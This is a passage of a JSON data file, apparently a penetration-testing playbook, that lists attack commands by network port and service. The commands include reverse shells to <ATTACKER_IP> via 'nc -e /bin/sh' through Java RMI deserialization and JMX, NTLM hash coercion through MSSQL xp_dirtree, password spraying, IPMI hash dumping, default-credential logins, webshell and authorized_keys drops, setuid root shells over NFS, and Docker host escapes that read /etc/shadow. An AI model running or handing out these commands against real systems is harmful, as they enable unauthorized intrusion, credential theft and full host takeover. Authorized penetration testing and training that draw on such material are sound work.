    {
     "label": "NSE sweep (recursion, NSID, zone transfer)",
     "cmd": "nmap -p53 -sCV --script dns-nsid,dns-recursion,dns-service-discovery,dns-zone-transfer --script-args dns-zone-transfer.domain=<DOMAIN> <TARGET_IP> -oN nmap_dns.txt",
     "when": "always"
    },
    {
     "label": "Server version disclosure",
     "cmd": "dig CH TXT version.bind @<TARGET_IP> +short",
     "when": "always"
    },
    {
     "label": "AD service records (identifies the domain and DCs)",
     "cmd": "dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<TARGET_IP> +short && dig SRV _kerberos._tcp.<DOMAIN> @<TARGET_IP> +short",
     "when": "if Windows/AD suspected"
    },
    {
     "label": "Subdomain brute through the target resolver",
     "cmd": "gobuster dns -d <DOMAIN> -r <TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
     "when": "if domain name known"
    },
    {
     "label": "Reverse sweep of the subnet",
     "cmd": "for i in $(seq 1 254); do dig +short -x <SUBNET>.$i @<TARGET_IP> | sed \"s/^/<SUBNET>.$i /\"; done | grep -v '^$'",
     "when": "if internal resolver"
    }
   ]
  },
  {
   "ports": [
    69
   ],
   "service": "tftp",
   "note": "TFTP has no directory listing — you must guess filenames, so this is where network-gear config backups live (`running-config`, `startup-config`, `<hostname>-confg`, `vrrpd.conf`). Also test write: a writable TFTP root sitting inside a webroot or a PXE path is a straight foothold.",
   "commands": [
    {
     "label": "Filename brute force",
     "cmd": "nmap -sU -p69 -sV --script tftp-enum <TARGET_IP> -oN nmap_tftp.txt",
     "when": "always"
    },
    {
     "label": "Interactive fetch",
     "cmd": "tftp <TARGET_IP>  # then: binary, get running-config, get startup-config",
     "when": "always"
    },
    {
     "label": "Scripted fetch of likely config names",
     "cmd": "for f in running-config startup-config config.text backup.cfg system.cfg web.conf; do curl -s --max-time 5 -o \"$f\" tftp://<TARGET_IP>/$f && [ -s \"$f\" ] && echo \"GOT $f\"; done",
     "when": "always"
    },
    {
     "label": "Write test",
     "cmd": "echo test > t.txt && curl -T t.txt tftp://<TARGET_IP>/t.txt && curl -s tftp://<TARGET_IP>/t.txt",
     "when": "always"
    },
    {
     "label": "Upload a payload to a known path",
     "cmd": "tftp <TARGET_IP> -c put shell.php",
     "when": "if writable and webroot path known"
    }
   ]
  },
  {
   "ports": [
    79
   ],
   "service": "finger",
   "note": "Beyond username validation, finger prints ~/.plan and ~/.project contents — people put passwords and handover notes there. On old Solaris `finger 'a b c d e f g h'@host` dumps every logged-in user in one shot, and `finger 0@host`/`finger .@host` are the other classic wildcards.",
   "commands": [
    {
     "label": "List logged-in users",
     "cmd": "finger @<TARGET_IP>",
     "when": "always"
    },
    {
     "label": "Solaris wildcard dump",
     "cmd": "finger 'a b c d e f g h'@<TARGET_IP>",
     "when": "always"
    },
    {
     "label": "Query a specific user (.plan/.project leak)",
     "cmd": "finger <USER>@<TARGET_IP>",
     "when": "if usernames known"
    },
    {
     "label": "NSE",
     "cmd": "nmap -p79 -sCV --script finger <TARGET_IP> -oN nmap_finger.txt",
     "when": "always"
    },
    {
     "label": "Bulk user enumeration",
     "cmd": "for u in $(cat /usr/share/seclists/Usernames/top-usernames-shortlist.txt); do finger $u@<TARGET_IP> | grep -v 'no such user' ; done",
     "when": "always"
    }
   ]
  },
  {
   "ports": [
    80,
    443,
    8080,
    8443,
    8000,
    8888
   ],
   "service": "http(s)",
   "note": "The single biggest miss is name-based virtual hosting: hitting the bare IP serves a decoy while the real app answers only to a Host header — fuzz vhosts and pull the TLS cert's CN/SAN for hostnames, then add them to /etc/hosts before you do anything else. Second miss: 403 on a directory still means it exists, so filter on size/words rather than on status.",
   "commands": [
    {
     "label": "Fingerprint, headers, cert SANs",
     "cmd": "whatweb -a3 http://<TARGET_IP>:<PORT> && curl -skI https://<TARGET_IP>:<PORT>/ ; openssl s_client -connect <TARGET_IP>:<PORT> </dev/null 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName",
     "when": "always"
    },
    {
     "label": "Content discovery with extensions",
     "cmd": "feroxbuster -u http://<TARGET_IP>:<PORT> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,old --depth 3 -o ferox_<PORT>.txt",
     "when": "always"
    },
    {
     "label": "Virtual host discovery",
     "cmd": "ffuf -u http://<TARGET_IP>:<PORT> -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac -t 60 -o vhosts.json",
     "when": "always"
    },
    {
     "label": "Obvious-file sweep",
     "cmd": "curl -sk http://<TARGET_IP>:<PORT>/robots.txt http://<TARGET_IP>:<PORT>/sitemap.xml http://<TARGET_IP>:<PORT>/.git/HEAD http://<TARGET_IP>:<PORT>/.env http://<TARGET_IP>:<PORT>/server-status",
     "when": "always"
    },
    {
     "label": "NSE quick pass",
     "cmd": "nmap -p<PORT> -sCV --script http-enum,http-title,http-methods,http-headers,http-robots.txt,http-webdav-scan <TARGET_IP> -oN nmap_http_<PORT>.txt",
     "when": "always"
    },
    {
     "label": "Templated vulnerability scan",
     "cmd": "nuclei -u http://<TARGET_IP>:<PORT> -severity critical,high,medium -o nuclei_<PORT>.txt",
     "when": "if scanning is in scope"
    }
   ]
  },
  {
   "ports": [
    88
   ],
   "service": "kerberos",
   "note": "Port 88 open = this host is a domain controller; that alone reframes the whole box. Kerberos pre-auth username enumeration is credential-free and does NOT increment the lockout counter (unlike SMB spraying), so enumerate here first. Everything Kerberos breaks if your clock skews more than 5 minutes from the DC — sync before you debug anything else.",
   "commands": [
    {
     "label": "Sync clock to the DC (do this first)",
     "cmd": "sudo ntpdate -u <DC_IP> || sudo rdate -n <DC_IP>",
     "when": "always"
    },
    {
     "label": "Credential-free username enumeration",
     "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerbrute_users.txt",
     "when": "if domain name known"
    },
    {
     "label": "AS-REP roast users without pre-auth",
     "cmd": "impacket-GetNPUsers '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -outputfile asrep_hashes.txt",
     "when": "if usernames known"
    },
    {
     "label": "Password spray (watch lockout policy)",
     "cmd": "kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt '<PASS>'",
     "when": "if a candidate password is known"
    },
    {
     "label": "NSE user enumeration",
     "cmd": "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=users.txt <TARGET_IP> -oN nmap_krb.txt",
     "when": "always"
    },
    {
     "label": "Request a TGT once you have creds",
     "cmd": "impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> && export KRB5CCNAME=<USER>.ccache",
     "when": "if creds known"
    }
   ]
  },
  {
   "ports": [
    110,
    143,
    993,
    995
   ],
   "service": "pop3/imap",
   "note": "Mailboxes are where the next set of credentials lives, so this is a post-credential service more than a pre-credential one. Check `CAPA`/`CAPABILITY` for AUTH=NTLM (leaks the domain) and for plaintext auth on the cleartext ports. And never stop at INBOX — `LIST \"\" \"*\"` surfaces Sent/Drafts/Archive where the good mail actually is.",
   "commands": [
    {
     "label": "Capabilities + NTLM info",
     "cmd": "nmap -p110,143,993,995 -sCV --script pop3-capabilities,imap-capabilities,pop3-ntlm-info,imap-ntlm-info <TARGET_IP> -oN nmap_mail.txt",
     "when": "always"
    },
    {
     "label": "List all IMAP folders",
     "cmd": "curl -k --url 'imaps://<TARGET_IP>' --user '<USER>:<PASS>' --request 'LIST \"\" \"*\"'",
     "when": "if creds known"
    },
    {
     "label": "Dump a mailbox",
     "cmd": "curl -k --url 'imaps://<TARGET_IP>/INBOX' --user '<USER>:<PASS>' --request 'FETCH 1:* (BODY[])' -o inbox.txt",
     "when": "if creds known"
    },
    {
     "label": "Manual TLS session",
     "cmd": "openssl s_client -connect <TARGET_IP>:993 -crlf -quiet  # a1 LOGIN <USER> '<PASS>'  /  a2 LIST \"\" \"*\"",
     "when": "always"
    },
    {
     "label": "Manual POP3",
     "cmd": "nc -nv <TARGET_IP> 110  # USER <USER> / PASS <PASS> / LIST / RETR 1",
     "when": "if cleartext port open"
    },
    {
     "label": "Credential spray",
     "cmd": "hydra -L users.txt -P passwords.txt imap://<TARGET_IP> -t 4 -f",
     "when": "if usernames known"
    }
   ]
  },
  {
   "ports": [
    111
   ],
   "service": "rpcbind",
   "note": "rpcbind is a directory, not a target: `rpcinfo -p` tells you which RPC services exist and on which (often high, often unfiltered) ports — nfs on 2049 can look filtered while the portmapper-advertised port answers. Watch for rusersd/rstatd/ypbind: NIS leaks the whole user database including crackable hashes.",
   "commands": [
    {
     "label": "Enumerate registered RPC programs",
     "cmd": "rpcinfo -p <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "TCP+UDP NSE pass",
     "cmd": "nmap -sSUC -p111 <TARGET_IP> -oN nmap_rpcbind.txt",
     "when": "always"
    },
    {
     "label": "NFS exports via portmapper",
     "cmd": "showmount -e <TARGET_IP>",
     "when": "if nfs program registered"
    },
    {
     "label": "Logged-in users via rusersd",
     "cmd": "rusers -al <TARGET_IP>",
     "when": "if rusersd registered"
    },
    {
     "label": "NIS domain / map dump",
     "cmd": "ypwhich -d <DOMAIN> <TARGET_IP> && ypcat -d <DOMAIN> -h <TARGET_IP> passwd.byname",
     "when": "if ypbind/ypserv registered"
    }
   ]
  },
  {
   "ports": [
    135,
    593
   ],
   "service": "msrpc",
   "note": "135 is not just 'Windows' — `rpcdump` fingerprints the role (DC, Exchange, SCCM, spooler, certsrv) from the registered interfaces. The underused trick is the IOXIDResolver/ServerAlive2 call: it returns every network interface the host has, including IPv6 and internal subnets you had no other way to see. 593 is the same RPC over HTTP and is often left open when 135 is filtered.",
   "commands": [
    {
     "label": "Dump registered RPC endpoints",
     "cmd": "impacket-rpcdump <TARGET_IP> | tee rpcdump.txt && grep -iE 'spoolss|drsuapi|certsrv|efsr|MS-|Protocol:' rpcdump.txt",
     "when": "always"
    },
    {
     "label": "Identify interfaces by UUID",
     "cmd": "impacket-rpcmap 'ncacn_ip_tcp:<TARGET_IP>[135]'",
     "when": "always"
    },
    {
     "label": "Leak all host network interfaces (IOXIDResolver)",
     "cmd": "impacket-rpcmap 'ncacn_ip_tcp:<TARGET_IP>[135]' -brute-uuids ; python3 IOXIDResolver.py -t <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "RPC over HTTP endpoint dump",
     "cmd": "impacket-rpcdump -port 593 <TARGET_IP>",
     "when": "if 593 open"
    },
    {
     "label": "RID cycling for domain users",
     "cmd": "impacket-lookupsid '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> 20000 | tee lookupsid.txt",
     "when": "if creds known (works with guest/null on some hosts)"
    }
   ]
  },
  {
   "ports": [
    139,
    445
   ],
   "service": "smb",
   "note": "Null session refused does not mean anonymous refused — try `-u 'guest' -p ''` and `-u 'a' -p ''` separately, they behave differently. Once you have any valid domain user, `--shares` almost always finds a readable SYSVOL/NETLOGON or a departmental share with a script containing credentials. Note `signing:False` in the banner: that host is a relay target.",
   "commands": [
    {
     "label": "Banner, signing, null and guest auth",
     "cmd": "nxc smb <TARGET_IP> -u '' -p '' ; nxc smb <TARGET_IP> -u 'guest' -p ''",
     "when": "always"
    },
    {
     "label": "Shares + RID brute with whatever access you have",
     "cmd": "nxc smb <TARGET_IP> -u 'guest' -p '' --shares --rid-brute 20000",
     "when": "always"
    },
    {
     "label": "Full anonymous enumeration",
     "cmd": "enum4linux-ng -A -C <TARGET_IP> | tee enum4linux_ng.txt",
     "when": "always"
    },
    {
     "label": "Manual share listing and browse",
     "cmd": "smbclient -L //<TARGET_IP> -N && smbclient //<TARGET_IP>/<SHARE> -N -c 'recurse ON; ls'",
     "when": "always"
    },
    {
     "label": "Spider every readable share for interesting files",
     "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus -o EXCLUDE_DIR=IPC$,print$",
     "when": "if creds known"
    },
    {
     "label": "Legacy vuln + dialect check",
     "cmd": "nmap -p445 --script smb-protocols,smb2-security-mode,smb-vuln-ms17-010 <TARGET_IP> -oN nmap_smb.txt",
     "when": "if host looks old / non-domain"
    }
   ]
  },
  {
   "ports": [
    161,
    162
   ],
   "service": "snmp",
   "note": "'public' is the first guess, not the only one — brute the community string before declaring it dead. Then two details matter: a bare `snmpwalk` only walks a default subtree, so pass `.` to get the whole tree; and NET-SNMP-EXTEND-MIB entries are command output configured by the admin, which is frequently a direct path to RCE or to plaintext credentials.",
   "commands": [
    {
     "label": "Brute the community string",
     "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "Walk the entire tree",
     "cmd": "snmpbulkwalk -v2c -c public -Cr1000 <TARGET_IP> . | tee snmp_full.txt",
     "when": "if community string known"
    },
    {
     "label": "Structured summary",
     "cmd": "snmp-check <TARGET_IP> -c public -v 2c",
     "when": "if community string known"
    },
    {
     "label": "Windows local users (LanMgr MIB)",
     "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
     "when": "if Windows host"
    },
    {
     "label": "Running processes and their full command lines (creds in argv)",
     "cmd": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.4 && snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.5",
     "when": "if community string known"
    },
    {
     "label": "Admin-defined extend objects (RCE candidates)",
     "cmd": "snmpwalk -v2c -c public <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects",
     "when": "if community string known"
    }
   ]
  },
  {
   "ports": [
    389,
    636,
    3268,
    3269
   ],
   "service": "ldap",
   "note": "Even when anonymous search is blocked, the RootDSE is readable unauthenticated and hands you the defaultNamingContext, the DC's DNS hostname and the forest functional level — that is your domain name without touching SMB. With any user, search `description`/`info` attributes for passwords, and prefer 3268 (Global Catalog) with an empty base DN to search the entire forest in one query.",
   "commands": [
    {
     "label": "RootDSE — naming contexts, DC name, functional level",
     "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b '' -s base '(objectClass=*)' | tee rootdse.txt",
     "when": "always"
    },
    {
     "label": "Anonymous full dump",
     "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=<DC>,DC=<TLD>' '(objectClass=*)' | tee ldap_anon.txt",
     "when": "always"
    },
    {
     "label": "Passwords hidden in description fields",
     "cmd": "nxc ldap <TARGET_IP> -u <USER> -p '<PASS>' -M get-desc-users",
     "when": "if creds known"
    },
    {
     "label": "Global Catalog forest-wide user search",
     "cmd": "ldapsearch -x -H ldap://<TARGET_IP>:3268 -D '<USER>@<DOMAIN>' -w '<PASS>' -b '' '(&(objectCategory=person)(objectClass=user))' sAMAccountName description memberOf userPrincipalName",
     "when": "if creds known and 3268 open"
    },
    {
     "label": "BloodHound collection over LDAP",
     "cmd": "nxc ldap <TARGET_IP> -u <USER> -p '<PASS>' --bloodhound -c All --dns-server <DC_IP>",
     "when": "if creds known"
    },
    {
     "label": "AD CS template abuse check",
     "cmd": "certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout",
     "when": "if creds known and AD CS present"
    }
   ]
  },
  {
   "ports": [
    512,
    513,
    514
   ],
   "service": "r-services",
   "note": "These are trust-based, not password-based: a `.rhosts` or `hosts.equiv` containing `+ +` gives you a shell as any user including root, with no credential at all. rsh/rlogin must bind a privileged source port, so run them as root or they fail with a misleading permission error — people give up here thinking the service is closed.",
   "commands": [
    {
     "label": "Fingerprint all three",
     "cmd": "nmap -p512,513,514 -sCV <TARGET_IP> -oN nmap_rservices.txt",
     "when": "always"
    },
    {
     "label": "rlogin as root (run as root locally)",
     "cmd": "sudo rlogin -l root <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "rsh command execution",
     "cmd": "sudo rsh -l root <TARGET_IP> 'id; cat /root/.rhosts'",
     "when": "always"
    },
    {
     "label": "Enumerate users to target for trust",
     "cmd": "rwho -a <TARGET_IP> ; rusers -al <TARGET_IP>",
     "when": "if rwhod/rusersd running"
    },
    {
     "label": "Try every discovered username",
     "cmd": "for u in root admin oracle bin daemon $(cat users.txt); do echo \"== $u\"; sudo rsh -l $u <TARGET_IP> id 2>/dev/null; done",
     "when": "if usernames known"
    }
   ]
  },
  {
   "ports": [
    623
   ],
   "service": "ipmi",
   "note": "IPMI 2.0's RAKP exchange (CVE-2013-4786) hands you a crackable hash for any valid username with no authentication at all — this is a protocol-level flaw, not a misconfiguration, and it is present on almost every BMC. Cipher zero is the other one: it accepts any password outright. BMC compromise means host compromise via virtual media, and vendors ship fixed defaults (ADMIN/ADMIN on Supermicro, root/calvin on Dell iDRAC).",
   "commands": [
    {
     "label": "Version and auth capabilities",
     "cmd": "nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <TARGET_IP> -oN nmap_ipmi.txt",
     "when": "always"
    },
    {
     "label": "Dump RAKP hashes (no creds needed)",
     "cmd": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; set OUTPUT_HASHCAT_FILE ipmi_hashes.txt; run; exit'",
     "when": "always"
    },
    {
     "label": "Crack the RAKP hashes",
     "cmd": "hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt",
     "when": "if hashes dumped"
    },
    {
     "label": "Cipher-zero auth bypass",
     "cmd": "ipmitool -I lanplus -C 0 -H <TARGET_IP> -U Admin -P anything user list",
     "when": "if cipher zero reported"
    },
    {
     "label": "Vendor default credentials",
     "cmd": "ipmitool -I lanplus -H <TARGET_IP> -U ADMIN -P ADMIN user list ; ipmitool -I lanplus -H <TARGET_IP> -U root -P calvin user list",
     "when": "always"
    },
    {
     "label": "Dump password hashes once authenticated",
     "cmd": "ipmitool -I lanplus -H <TARGET_IP> -U <USER> -P '<PASS>' user list && ipmitool -I lanplus -H <TARGET_IP> -U <USER> -P '<PASS>' lan print",
     "when": "if creds known"
    }
   ]
  },
  {
   "ports": [
    873
   ],
   "service": "rsync",
   "note": "Module listing is anonymous by default — the trailing `::` (or `rsync://host/`) is the whole enumeration. The kill shot is a writable module rooted at a home directory or webroot: drop an authorized_keys or a webshell. Also note rsync preserves the sender's UID with `-a`, so files you write can land owned by root.",
   "commands": [
    {
     "label": "List modules",
     "cmd": "rsync -av --list-only rsync://<TARGET_IP>:873/",
     "when": "always"
    },
    {
     "label": "List a module's contents",
     "cmd": "rsync -av --list-only rsync://<TARGET_IP>:873/<SHARE>/",
     "when": "if modules listed"
    },
    {
     "label": "Pull everything",
     "cmd": "rsync -av rsync://<TARGET_IP>:873/<SHARE>/ ./rsync_loot/",
     "when": "if module readable"
    },
    {
     "label": "Write test / authorized_keys drop",
     "cmd": "rsync -av ./authorized_keys rsync://<TARGET_IP>:873/<SHARE>/root/.ssh/authorized_keys",
     "when": "if module writable"
    },
    {
     "label": "NSE module list",
     "cmd": "nmap -p873 -sCV --script rsync-list-modules <TARGET_IP> -oN nmap_rsync.txt",
     "when": "always"
    },
    {
     "label": "Authenticated module access",
     "cmd": "RSYNC_PASSWORD='<PASS>' rsync -av --list-only rsync://<USER>@<TARGET_IP>:873/<SHARE>/",
     "when": "if module requires auth and creds known"
    }
   ]
  },
  {
   "ports": [
    1099,
    1098,
    1050,
    9999,
    8686,
    11099
   ],
   "service": "java-rmi",
   "note": "The bound names in the registry tell you what the app is, and remote-method-guesser checks the JEP290 deserialization filter and known bypasses that nmap's rmi scripts will not. If it turns out to be JMX (often 9999/8686) with no authentication, that is direct RCE via MLet — and JMX with only a password set still frequently allows the MLet path.",
   "commands": [
    {
     "label": "Registry enumeration + vuln checks",
     "cmd": "rmg enum <TARGET_IP> <PORT>",
     "when": "always"
    },
    {
     "label": "NSE registry dump",
     "cmd": "nmap -p<PORT> -sCV --script rmi-dumpregistry,rmi-vuln-classloader <TARGET_IP> -oN nmap_rmi.txt",
     "when": "always"
    },
    {
     "label": "Guess remote methods on bound objects",
     "cmd": "rmg guess <TARGET_IP> <PORT>",
     "when": "if bound names found"
    },
    {
     "label": "Deserialization RCE attempt",
     "cmd": "rmg serial <TARGET_IP> <PORT> CommonsCollections6 'nc <ATTACKER_IP> <LPORT> -e /bin/sh' --bound-name <NAME>",
     "when": "if JEP290 missing or gadget available"
    },
    {
     "label": "JMX enumeration",
     "cmd": "beanshooter enum <TARGET_IP> <PORT>",
     "when": "if service is JMX"
    },
    {
     "label": "JMX MLet RCE",
     "cmd": "beanshooter standard <TARGET_IP> <PORT> exec 'nc <ATTACKER_IP> <LPORT> -e /bin/sh'",
     "when": "if JMX unauthenticated"
    }
   ]
  },
  {
   "ports": [
    1433,
    1434
   ],
   "service": "mssql",
   "note": "Check UDP 1434 first — the SQL Browser lists named instances on dynamic ports you would otherwise never scan. Domain-joined boxes need `-windows-auth` or your correct-looking credentials silently fail. And you do not need xp_cmdshell to profit: `xp_dirtree \\\\<ATTACKER_IP>\\share` runs with only the public role and coerces the service account's NetNTLMv2 to your Responder.",
   "commands": [
    {
     "label": "Instance discovery via SQL Browser",
     "cmd": "nmap -sU -p1434 --script ms-sql-info,ms-sql-dac <TARGET_IP> -oN nmap_mssql_browser.txt",
     "when": "always"
    },
    {
     "label": "Authenticate (domain or local)",
     "cmd": "impacket-mssqlclient '<DOMAIN>/<USER>:<PASS>'@<TARGET_IP> -windows-auth",
     "when": "if creds known"
    },
    {
     "label": "Map databases, privileges and impersonation",
     "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM sys.databases' ; nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -M mssql_priv",
     "when": "if creds known"
    },
    {
     "label": "Coerce the service account hash (public role is enough)",
     "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q \"EXEC master..xp_dirtree '\\\\\\\\<ATTACKER_IP>\\\\share'\"  # run: sudo responder -I tun0",
     "when": "if any authenticated access"
    },
    {
     "label": "Command execution via xp_cmdshell",
     "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' ",
     "when": "if sysadmin or xp_cmdshell enabled"
    },
    {
     "label": "Credential spray (local auth)",
     "cmd": "nxc mssql <TARGET_IP> -u users.txt -p passwords.txt --local-auth --continue-on-success",
     "when": "if no creds"
    }
   ]
  },
  {
   "ports": [
    1521,
    1522,
    1523,
    1524,
    1525,
    1526,
    1527,
    1528,
    1529
   ],
   "service": "oracle-tns",
   "note": "You cannot do anything without a valid SID, and Oracle will not tell you — brute it. Old listeners (pre-10g) answer `status` unauthenticated and hand you the SID plus the full file paths. Once in, odat's utlfile/externaltable modules give file write and command execution, so a low-privilege DB account is often enough.",
   "commands": [
    {
     "label": "Version + SID brute",
     "cmd": "nmap -p1521 -sCV --script oracle-tns-version,oracle-sid-brute <TARGET_IP> -oN nmap_oracle.txt",
     "when": "always"
    },
    {
     "label": "Dedicated SID guesser",
     "cmd": "odat sidguesser -s <TARGET_IP> -p 1521",
     "when": "always"
    },
    {
     "label": "Default/weak account guessing against a known SID",
     "cmd": "odat passwordguesser -s <TARGET_IP> -p 1521 -d <SID> --accounts-file accounts/accounts_multiple.txt",
     "when": "if SID known"
    },
    {
     "label": "Run every odat module",
     "cmd": "odat all -s <TARGET_IP> -p 1521 -d <SID> -U <USER> -P <PASS>",
     "when": "if SID (and ideally creds) known"
    },
    {
     "label": "Interactive SQL session",
     "cmd": "sqlplus '<USER>/<PASS>@<TARGET_IP>:1521/<SID>'  # then: SELECT * FROM all_users;",
     "when": "if creds known"
    },
    {
     "label": "File write to disk (webshell/DLL drop)",
     "cmd": "odat utlfile -s <TARGET_IP> -p 1521 -d <SID> -U <USER> -P <PASS> --putFile /tmp shell.sh ./shell.sh",
     "when": "if creds known and file write needed"
    }
   ]
  },
  {
   "ports": [
    2049
   ],
   "service": "nfs",
   "note": "Two things decide everything: `no_root_squash` (copy in a setuid binary as root and you own the host) and UID matching (create a local user with the same UID as the file owner and the permissions simply apply). NFSv4 does not answer showmount at all — if showmount comes back empty, mount `/` with `-t nfs4` before concluding there are no exports.",
   "commands": [
    {
     "label": "List exports and allowed hosts",
     "cmd": "showmount -e <TARGET_IP>",
     "when": "always"
    },
    {
     "label": "Enumerate shares, UIDs and permissions",
     "cmd": "nxc nfs <TARGET_IP> --shares && nxc nfs <TARGET_IP> --enum-shares 3",
     "when": "always"
    },
    {
     "label": "Mount (v3 is the permissive one)",
     "cmd": "sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3,nolock <TARGET_IP>:<EXPORT_PATH> /mnt/nfs",
     "when": "if exports listed"
    },
    {
     "label": "NFSv4 blind mount of the root export",
     "cmd": "sudo mount -t nfs4 <TARGET_IP>:/ /mnt/nfs",
     "when": "if showmount returns nothing"
    },
    {
     "label": "Test for no_root_squash",
     "cmd": "sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash && ls -l /mnt/nfs/rootbash",
     "when": "if writable export"
    },
    {
     "label": "NSE listing without mounting",
     "cmd": "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p111,2049 <TARGET_IP> -oN nmap_nfs.txt",
     "when": "always"
    }
   ]
  },
  {
   "ports": [
    2375,
    2376
   ],
   "service": "docker-api",
   "note": "An unauthenticated 2375 is root on the host, full stop — bind-mount `/` into a throwaway container and chroot. Even when you cannot run a container, `/containers/json` and image `Config.Env` leak credentials that developers passed as environment variables, and `/images/json` reveals the internal registry hostname. 2376 is the TLS port and usually requires client certs.",
   "commands": [
    {
     "label": "Confirm unauthenticated access",
     "cmd": "curl -s --max-time 5 http://<TARGET_IP>:2375/version | jq .",
     "when": "always"
    },
    {
     "label": "Enumerate containers and images",
     "cmd": "docker -H tcp://<TARGET_IP>:2375 ps -a && docker -H tcp://<TARGET_IP>:2375 images",
     "when": "if API responds"
    },
    {
     "label": "Harvest secrets from container environments",
     "cmd": "curl -s http://<TARGET_IP>:2375/containers/json?all=1 | jq -r '.[].Id' | while read id; do curl -s http://<TARGET_IP>:2375/containers/$id/json | jq -r '.Config.Env[]?'; done",
     "when": "if API responds"
    },
    {
     "label": "Host filesystem escape",
     "cmd": "docker -H tcp://<TARGET_IP>:2375 run --rm -v /:/hostfs -it alpine chroot /hostfs /bin/sh",
     "when": "if API responds and image pull/exec allowed"
    },
    {
     "label": "Read host files without running a shell",
     "cmd": "docker -H tcp://<TARGET_IP>:2375 run --rm -v /:/hostfs alpine cat /hostfs/root/.ssh/id_rsa /hostfs/etc/shadow",
     "when": "if container exec allowed"
    },
    {
     "label": "TLS port with recovered client certs",
     "cmd": "docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://<TARGET_IP>:2376 ps",
     "when": "if 2376 and client certs found"
    }
   ]
  },
  {
   "ports": [
    3128,
    8118,
    1080
   ],
   "service": "http-proxy",
   "note": "An open forward proxy is a pivot, not a finding — CONNECT through it to reach localhost-bound services and internal RFC1918 hosts that your scan could never touch. Squid in particular often allows CONNECT to 127.0.0.1, which exposes the admin panels the sysadmin thought were safely bound to loopback. Feed it to proxychains and rescan from the inside.",
   "commands": [
    {
     "label": "Confirm the proxy relays and reach loopback",
     "cmd": "curl -s -x http://<TARGET_IP>:3128 http://127.0.0.1/ -v",
     "when": "always"
    },
    {
     "label": "Port-scan through the proxy",
     "cmd": "for p in 80 443 3000 5000 8000 8080 8443 9000 9200 27017; do echo -n \"$p: \"; curl -s -o /dev/null -w '%{http_code}\\n' --max-time 4 -x http://<TARGET_IP>:3128 http://127.0.0.1:$p/; done",
     "when": "if proxy relays"
    },
    {
     "label": "NSE open-proxy check",
     "cmd": "nmap -p3128,8118,1080 --script http-open-proxy,socks-open-proxy <TARGET_IP> -oN nmap_proxy.txt",
     "when": "always"
    },
    {
     "label": "Squid cache manager info leak",
     "cmd": "curl -s -x http://<TARGET_IP>:3128 'http://<TARGET_IP>/squid-internal-mgr/menu' ; curl -s -x http://<TARGET_IP>:3128 'cache_object://<TARGET_IP>/menu'",
     "when": "if squid"
    },
    {
     "label": "Pivot with proxychains",
     "cmd": "echo 'http <TARGET_IP> 3128' | sudo tee -a /etc/proxychains4.conf && proxychains4 -q nmap -sT -Pn -n -p80,443,445,3389 <INTERNAL_SUBNET>/24",
     "when": "if proxy relays to internal hosts"
    }
   ]
  },
  {
   "ports": [
    3306
   ],
   "service": "mysql",
   "note": "The account matters more than the shell: a user with FILE privilege reads /etc/passwd and application configs via `load_file()`, and can write a webshell if `secure_file_priv` is empty — check that variable before anything else. Older servers reject modern clients' TLS, so `--ssl=0` (or `--skip-ssl`) is what turns a 'connection failed' into a session.",
   "commands": [
    {
     "label": "Info, empty passwords, users, variables",
     "cmd": "nmap -p3306 -sCV --script mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables <TARGET_IP> -oN nmap_mysql.txt",
     "when": "always"
    },
    {
     "label": "Try passwordless root",
     "cmd": "mysql -h <TARGET_IP> -u root --ssl=0 -e 'select version(), user();'",
     "when": "always"
    },
    {
     "label": "Check FILE privilege and file-write policy",
     "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' --ssl=0 -e \"select @@version, @@secure_file_priv, @@plugin_dir, user(); show grants;\"",
     "when": "if creds known"
    },
    {
     "label": "Read host files",
     "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' --ssl=0 -e \"select load_file('/etc/passwd');\"",
     "when": "if FILE privilege"
    },
    {
     "label": "Dump credential tables",
